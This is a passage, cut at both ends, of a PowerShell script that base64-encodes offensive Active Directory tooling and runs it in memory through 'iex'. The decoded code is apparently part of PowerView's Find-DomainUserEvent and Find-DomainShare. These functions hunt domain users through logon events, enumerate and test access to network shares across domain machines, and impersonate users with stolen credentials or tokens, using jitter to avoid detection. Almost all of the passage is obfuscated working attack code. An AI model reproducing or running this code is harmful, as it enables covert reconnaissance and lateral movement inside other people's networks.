ZXJzID0gR2V0LURvbWFpbkdyb3VwTWVtYmVyIEBHcm91cFNlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgTWVtYmVyTmFtZQogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck5hbWUnXSkgewogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gJENvbXB1dGVyTmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJERDU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgJ0xEQVAnID0gJFRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkRENTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJERDU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkRENTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyRXZlbnRdIFF1ZXJ5aW5nIGZvciBkb21haW4gY29udHJvbGxlcnMgaW4gZG9tYWluOiAkRG9tYWluIgogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gR2V0LURvbWFpbkNvbnRyb2xsZXIgQERDU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBkbnNob3N0bmFtZQogICAgICAgIH0KICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVycyAtYW5kICgkVGFyZ2V0Q29tcHV0ZXJzIC1pc25vdCBbU3lzdGVtLkFycmF5XSkpIHsKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEAoLCRUYXJnZXRDb21wdXRlcnMpCiAgICAgICAgfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJFdmVudF0gVGFyZ2V0Q29tcHV0ZXJzIGxlbmd0aDogJCgkVGFyZ2V0Q29tcHV0ZXJzLkxlbmd0aCkiCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckV2ZW50XSBUYXJnZXRDb21wdXRlcnMgJFRhcmdldENvbXB1dGVycyIKICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVycy5MZW5ndGggLWVxIDApIHsKICAgICAgICAgICAgdGhyb3cgJ1tGaW5kLURvbWFpblVzZXJFdmVudF0gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRlJwogICAgICAgIH0KICAgICAgICAkSG9zdEVudW1CbG9jayA9IHsKICAgICAgICAgICAgUGFyYW0oJENvbXB1dGVyTmFtZSwgJFN0YXJ0VGltZSwgJEVuZFRpbWUsICRNYXhFdmVudHMsICRUYXJnZXRVc2VycywgJEZpbHRlciwgJENyZWRlbnRpYWwpCiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAkVXAgPSBUZXN0LUNvbm5lY3Rpb24gLUNvdW50IDEgLVF1aWV0IC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICBpZiAoJFVwKSB7CiAgICAgICAgICAgICAgICAgICAgJERvbWFpblVzZXJFdmVudEFyZ3MgPSBAewogICAgICAgICAgICAgICAgICAgICAgICAnQ29tcHV0ZXJOYW1lJyA9ICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFN0YXJ0VGltZSkgeyAkRG9tYWluVXNlckV2ZW50QXJnc1snU3RhcnRUaW1lJ10gPSAkU3RhcnRUaW1lIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJEVuZFRpbWUpIHsgJERvbWFpblVzZXJFdmVudEFyZ3NbJ0VuZFRpbWUnXSA9ICRFbmRUaW1lIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJE1heEV2ZW50cykgeyAkRG9tYWluVXNlckV2ZW50QXJnc1snTWF4RXZlbnRzJ10gPSAkTWF4RXZlbnRzIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJENyZWRlbnRpYWwpIHsgJERvbWFpblVzZXJFdmVudEFyZ3NbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJEZpbHRlciAtb3IgJFRhcmdldFVzZXJzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkVGFyZ2V0VXNlcnMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdldC1Eb21haW5Vc2VyRXZlbnQgQERvbWFpblVzZXJFdmVudEFyZ3MgfCBXaGVyZS1PYmplY3QgeyRUYXJnZXRVc2VycyAtY29udGFpbnMgJF8uVGFyZ2V0VXNlck5hbWV9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT3BlcmF0b3IgPSAnb3InCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRmlsdGVyLktleXMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCgkXyAtZXEgJ09wJykgLW9yICgkXyAtZXEgJ09wZXJhdG9yJykgLW9yICgkXyAtZXEgJ09wZXJhdGlvbicpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoJEZpbHRlclskX10gLW1hdGNoICcmJykgLW9yICgkRmlsdGVyWyRfXSAtZXEgJ2FuZCcpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT3BlcmF0b3IgPSAnYW5kJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEtleXMgPSAkRmlsdGVyLktleXMgfCBXaGVyZS1PYmplY3QgeygkXyAtbmUgJ09wJykgLWFuZCAoJF8gLW5lICdPcGVyYXRvcicpIC1hbmQgKCRfIC1uZSAnT3BlcmF0aW9uJyl9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHZXQtRG9tYWluVXNlckV2ZW50IEBEb21haW5Vc2VyRXZlbnRBcmdzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkT3BlcmF0b3IgLWVxICdvcicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJEtleSBpbiAkS2V5cykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLiIkS2V5IiAtbWF0Y2ggJEZpbHRlclskS2V5XSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRLZXkgaW4gJEtleXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy4iJEtleSIgLW5vdG1hdGNoICRGaWx0ZXJbJEtleV0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgR2V0LURvbWFpblVzZXJFdmVudCBARG9tYWluVXNlckV2ZW50QXJncwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlbGF5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snU3RvcE9uU3VjY2VzcyddKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJFdmVudF0gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiAkKCRUYXJnZXRDb21wdXRlcnMuY291bnQpIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyRXZlbnRdIERlbGF5OiAkRGVsYXksIEppdHRlcjogJEppdHRlciIKICAgICAgICAgICAgJENvdW50ZXIgPSAwCiAgICAgICAgICAgICRSYW5kTm8gPSBOZXctT2JqZWN0IFN5c3RlbS5SYW5kb20KICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRUYXJnZXRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgICRDb3VudGVyID0gJENvdW50ZXIgKyAxCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkUmFuZE5vLk5leHQoKDEtJEppdHRlcikqJERlbGF5LCAoMSskSml0dGVyKSokRGVsYXkpCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyRXZlbnRdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkpIgogICAgICAgICAgICAgICAgJFJlc3VsdCA9IEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtQXJndW1lbnRMaXN0ICRUYXJnZXRDb21wdXRlciwgJFN0YXJ0VGltZSwgJEVuZFRpbWUsICRNYXhFdmVudHMsICRUYXJnZXRVc2VycywgJEZpbHRlciwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICRSZXN1bHQKICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0IC1hbmQgJFN0b3BPblN1Y2Nlc3MpIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyRXZlbnRdIFRhcmdldCB1c2VyIGZvdW5kLCByZXR1cm5pbmcgZWFybHkiCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJFdmVudF0gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHMiCiAgICAgICAgICAgICRTY3JpcHRQYXJhbXMgPSBAewogICAgICAgICAgICAgICAgJ1N0YXJ0VGltZScgPSAkU3RhcnRUaW1lCiAgICAgICAgICAgICAgICAnRW5kVGltZScgPSAkRW5kVGltZQogICAgICAgICAgICAgICAgJ01heEV2ZW50cycgPSAkTWF4RXZlbnRzCiAgICAgICAgICAgICAgICAnVGFyZ2V0VXNlcnMnID0gJFRhcmdldFVzZXJzCiAgICAgICAgICAgICAgICAnRmlsdGVyJyA9ICRGaWx0ZXIKICAgICAgICAgICAgICAgICdDcmVkZW50aWFsJyA9ICRDcmVkZW50aWFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgTmV3LVRocmVhZGVkRnVuY3Rpb24gLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXJzIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtU2NyaXB0UGFyYW1ldGVycyAkU2NyaXB0UGFyYW1zIC1UaHJlYWRzICRUaHJlYWRzCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1Eb21haW5TaGFyZSB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5TaGFyZUluZm8nKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRE5TSG9zdE5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJEb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckxEQVBGaWx0ZXIsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlYXJjaEJhc2UsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ09wZXJhdGluZ1N5c3RlbScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyT3BlcmF0aW5nU3lzdGVtLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTZXJ2aWNlUGFjaycpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2VydmljZVBhY2ssCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NpdGVOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTaXRlTmFtZSwKICAgICAgICBbQWxpYXMoJ0NoZWNrQWNjZXNzJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQ2hlY2tTaGFyZUFjY2VzcywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJERlbGF5ID0gMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgwLjAsIDEuMCldCiAgICAgICAgW0RvdWJsZV0KICAgICAgICAkSml0dGVyID0gLjMsCiAgICAgICAgW0ludF0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDApXQogICAgICAgICRUaHJlYWRzID0gMjAKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdkbnNob3N0bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJEb21haW4nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkQ29tcHV0ZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTERBUEZpbHRlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkQ29tcHV0ZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlYXJjaEJhc2UnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJENvbXB1dGVyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVW5jb25zdHJhaW5lZCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydVbmNvbnN0cmFpbmVkJ10gPSAkVW5jb25zdHJhaW5lZCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snT3BlcmF0aW5nU3lzdGVtJ10gPSAkT3BlcmF0aW5nU3lzdGVtIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlcnZpY2VQYWNrJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZpY2VQYWNrJ10gPSAkU2VydmljZVBhY2sgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2l0ZU5hbWUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2l0ZU5hbWUnXSA9ICRTaXRlTmFtZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJOYW1lJ10pIHsKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9ICRDb21wdXRlck5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tGaW5kLURvbWFpblNoYXJlXSBRdWVyeWluZyBjb21wdXRlcnMgaW4gdGhlIGRvbWFpbicKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEdldC1Eb21haW5Db21wdXRlciBAQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblNoYXJlXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiAkKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoKSIKICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVycy5MZW5ndGggLWVxIDApIHsKICAgICAgICAgICAgdGhyb3cgJ1tGaW5kLURvbWFpblNoYXJlXSBObyBob3N0cyBmb3VuZCB0byBlbnVtZXJhdGUnCiAgICAgICAgfQogICAgICAgICRIb3N0RW51bUJsb2NrID0gewogICAgICAgICAgICBQYXJhbSgkQ29tcHV0ZXJOYW1lLCAkQ2hlY2tTaGFyZUFjY2VzcywgJFRva2VuSGFuZGxlKQogICAgICAgICAgICBpZiAoJFRva2VuSGFuZGxlKSB7CiAgICAgICAgICAgICAgICAkTnVsbCA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtVG9rZW5IYW5kbGUgJFRva2VuSGFuZGxlIC1RdWlldAogICAgICAgICAgICB9CiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAkVXAgPSBUZXN0LUNvbm5lY3Rpb24gLUNvdW50IDEgLVF1aWV0IC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICBpZiAoJFVwKSB7CiAgICAgICAgICAgICAgICAgICAgJFNoYXJlcyA9IEdldC1OZXRTaGFyZSAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRTaGFyZSBpbiAkU2hhcmVzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTaGFyZU5hbWUgPSAkU2hhcmUuTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkUGF0aCA9ICdcXCcrJFRhcmdldENvbXB1dGVyKydcJyskU2hhcmVOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoJFNoYXJlTmFtZSkgLWFuZCAoJFNoYXJlTmFtZS50cmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRDaGVja1NoYXJlQWNjZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE51bGwgPSBbSU8uRGlyZWN0b3J5XTo6R2V0RmlsZXMoJFBhdGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTaGFyZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkVycm9yIGFjY2Vzc2luZyBzaGFyZSBwYXRoICRQYXRoIDogJF8iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNoYXJlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRUb2tlbkhhbmRsZSkgewogICAgICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRMb2dvblRva2VuID0gJE51bGwKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKICAgICAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCAtUXVpZXQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlbGF5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snU3RvcE9uU3VjY2VzcyddKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblNoYXJlXSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6ICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblNoYXJlXSBEZWxheTogJERlbGF5LCBKaXR0ZXI6ICRKaXR0ZXIiCiAgICAgICAgICAgICRDb3VudGVyID0gMAogICAgICAgICAgICAkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tCiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkVGFyZ2V0Q29tcHV0ZXJzKSB7CiAgICAgICAgICAgICAgICAkQ291bnRlciA9ICRDb3VudGVyICsgMQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluU2hhcmVdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkpIgogICAgICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1Bcmd1bWVudExpc3QgJFRhcmdldENvbXB1dGVyLCAkQ2hlY2tTaGFyZUFjY2VzcywgJExvZ29uVG9rZW4KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluU2hhcmVdIFVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHM6ICRUaHJlYWRzIgogICAgICAgICAgICAkU2NyaXB0UGFyYW1zID0gQHsKICAgICAgICAgICAgICAgICdDaGVja1NoYXJlQWNjZXNzJyA9ICRDaGVja1NoYXJlQWNjZXNzCiAgICAgICAgICAgICAgICAnVG9rZW5IYW5kbGUnID0gJExvZ29uVG9rZW4KICAgICAgICAgICAgfQogICAgICAgICAgICBOZXctVGhyZWFkZWRGdW5jdGlvbiAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcnMgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1TY3JpcHRQYXJhbWV0ZXJzICRTY3JpcHRQYXJhbXMgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICB9CiAgICB9CiAgICBFTkQgewogICAgICAgIGlmICgkT